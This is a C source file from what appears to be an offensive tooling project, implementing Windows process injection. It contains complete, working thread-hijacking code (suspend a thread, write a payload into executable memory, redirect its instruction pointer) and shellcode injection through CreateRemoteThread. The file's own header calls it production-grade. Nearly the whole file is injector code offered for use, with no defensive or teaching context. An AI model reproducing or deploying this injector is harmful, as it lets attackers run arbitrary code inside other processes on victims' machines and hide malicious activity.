/* ============================================================================
 * Jockey's Execution Engine -- other_injections.c
 * Thread hijacking (APC + Context) and shellcode injection.
 * No stubs. Architecture-safe. Production-grade.
 * ============================================================================ */

#include "../include/injection.h"
#include "../include/pal.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

/* ------------------------------------------------------------------
 * Find the main (earliest-created) thread ID for a given PID
 * ------------------------------------------------------------------ */
static DWORD find_main_thread_id(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te = {0};
    te.dwSize = sizeof(te);
    DWORD tid = 0;
    FILETIME ftCreate = {0};
    FILETIME ftDummy = {0};

    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te.th32ThreadID);
                if (hThread) {
                    FILETIME ftCurr = {0};
                    if (GetThreadTimes(hThread, &ftCurr, &ftDummy, &ftDummy, &ftDummy)) {
                        if (tid == 0 || CompareFileTime(&ftCurr, &ftCreate) < 0) {
                            ftCreate = ftCurr;
                            tid = te.th32ThreadID;
                        }
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    return tid;
}

/* ------------------------------------------------------------------
 * Thread Hijacking: suspend target thread, redirect RIP/EIP to payload,
 * then resume. Uses VirtualAllocEx + WriteProcessMemory + SetThreadContext.
 * ------------------------------------------------------------------ */
int perform_thread_hijacking(InjectionConfig* config) {
    if (!config || !config->payload || config->payloadSize == 0) {
        LOG_ERROR( "[-] Invalid config or payload\n");
        return -1;
    }

    HANDLE hProcess = NULL;
    DWORD pid = config->targetPid;
    BOOL createdSuspended = FALSE;

    if (pid == 0) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        if (!CreateProcessA(NULL, (LPSTR)config->targetImage, NULL, NULL, FALSE,
                            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            LOG_ERROR( "[-] CreateProcess failed: %lu\n", GetLastError());
            return -1;
        }
        pid = pi.dwProcessId;
        hProcess = pi.hProcess;
        createdSuspended = TRUE;
        LOG_INFO("[+] Created suspended process PID: %lu\n", pid);
    } else {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            LOG_ERROR( "[-] OpenProcess failed: %lu\n", GetLastError());
            return -1;
        }
        LOG_INFO("[+] Opened process PID: %lu\n", pid);
    }

    DWORD tid = find_main_thread_id(pid);
    if (!tid) {
        LOG_ERROR( "[-] Could not find main thread\n");
        if (createdSuspended) TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        return -1;
    }

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) {
        LOG_ERROR( "[-] OpenThread failed: %lu\n", GetLastError());
        if (createdSuspended) TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        return -1;
    }
    LOG_INFO("[+] Target main thread TID: %lu\n", tid);

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, config->payloadSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        LOG_ERROR( "[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hThread);
        if (createdSuspended) TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        return -1;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, config->payload, config->payloadSize, NULL)) {
        LOG_ERROR( "[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hThread);
        if (createdSuspended) TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        return -1;
    }
    LOG_INFO("[+] Payload written to %p\n", remoteMem);

    if (SuspendThread(hThread) == (DWORD)-1) {
        LOG_ERROR( "[-] SuspendThread failed: %lu\n", GetLastError());
        goto fail;
    }

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        LOG_ERROR( "[-] GetThreadContext failed: %lu\n", GetLastError());
        ResumeThread(hThread);
        goto fail;
    }

#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMem;
#else
    ctx.Eip = (DWORD)remoteMem;
#endif

    if (!SetThreadContext(hThread, &ctx)) {
        LOG_ERROR( "[-] SetThreadContext failed: %lu\n", GetLastError());
        ResumeThread(hThread);
        goto fail;
    }
    LOG_INFO("[+] Thread context hijacked to payload\n");

    if (createdSuspended) {
        DWORD cnt = ResumeThread(hThread);
        if (cnt != (DWORD)-1)
            LOG_INFO("[+] Main thread resumed (count was %lu)\n", cnt);
    }

    if (ResumeThread(hThread) != (DWORD)-1) {
        LOG_INFO("[+] Hijacked thread resumed. Injection complete.\n");
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;

fail:
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    if (createdSuspended) TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return -1;
}

/* ------------------------------------------------------------------
 * Shellcode Injection: allocate RWX, write payload, create remote thread.
 * Supports both suspended-process creation and existing process injection.
 * ------------------------------------------------------------------ */
int perform_shellcode_injection(InjectionConfig* config) {
    if (!config || !config->payload || config->payloadSize == 0) {
        LOG_ERROR( "[-] Invalid config or payload\n");
        return -1;
    }

    HANDLE hProcess = NULL;
    DWORD pid = config->targetPid;
    BOOL createdSuspended = FALSE;

    if (pid == 0) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        if (!CreateProcessA(NULL, (LPSTR)config->targetImage, NULL, NULL, FALSE,
                            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            LOG_ERROR( "[-] CreateProcess failed: %lu\n", GetLastError());
            return -1;
        }
        pid = pi.dwProcessId;
        hProcess = pi.hProcess;
        createdSuspended = TRUE;
        LOG_INFO("[+] Created suspended process PID: %lu\n", pid);
    } else {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            LOG_ERROR( "[-] OpenProcess failed: %lu\n", GetLastError());
            return -1;
        }
        LOG_INFO("[+] Opened process PID: %lu\n", pid);
    }

    BOOL isWow64 = FALSE;
    BOOL isTarget64 = FALSE;
    if (IsWow64Process(hProcess, &isWow64)) {
        isTarget64 = !isWow64;
    }
#ifdef _WIN64
    if (!isTarget64) {
        LOG_ERROR( "[!] Warning: injecting 32-bit target from 64-bit process may fail\n");
    }
#endif

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, config->payloadSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        LOG_ERROR( "[-] VirtualAllocEx failed: %lu\n", GetLastError());
        if (createdSuspended) TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        return -1;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, config->payload, config->payloadSize, NULL)) {
        LOG_ERROR( "[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        if (createdSuspended) TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        return -1;
    }

    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
                                              (LPTHREAD_START_ROUTINE)(uintptr_t)remoteMem,
                                              NULL, 0, NULL);
    if (!hRemoteThread) {
        LOG_ERROR( "[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        if (createdSuspended) TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        return -1;
    }
    LOG_INFO("[+] Remote thread created at %p\n", remoteMem);

    if (createdSuspended) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            typedef LONG (NTAPI *NtResumeProcess_t)(HANDLE);
            union {
                FARPROC proc;
                NtResumeProcess_t fn;
            } ntResumeProcess = { .proc = GetProcAddress(hNtdll, "NtResumeProcess") };
            if (ntResumeProcess.proc) {
                LONG st = ntResumeProcess.fn(hProcess);
                if (st >= 0) LOG_INFO("[+] Process resumed via NtResumeProcess\n");
            }
        }
    }

    WaitForSingleObject(hRemoteThread, 5000);
    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);
    LOG_INFO("[+] Shellcode injection completed\n");
    return 0;
}

#else
int perform_thread_hijacking(InjectionConfig* config) {
    (void)config;
    LOG_ERROR( "[-] Thread hijacking not implemented on Linux\n");
    return -1;
}
int perform_shellcode_injection(InjectionConfig* config) {
    (void)config;
    LOG_ERROR( "[-] Shellcode injection not implemented on Linux\n");
    return -1;
}
#endif
